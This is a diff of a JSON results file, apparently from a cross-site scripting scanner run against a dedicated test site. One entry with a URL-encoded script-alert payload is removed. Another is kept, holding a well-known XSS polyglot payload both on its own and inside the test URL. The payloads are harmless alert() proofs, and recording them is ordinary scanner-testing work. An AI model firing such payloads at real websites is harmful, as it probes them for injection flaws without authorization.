@@ -2,11 +2,6 @@
     "results": [
         {
             "count": 1,
-            "payload": "xss=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%0A",
-            "url": "https://xss-suite-test-site.herokuapp.com/pages/simple_value.php"
-        },
-        {
-            "count": 2,
             "payload": "xss=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%0A",
             "url": "https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%0A"
         }
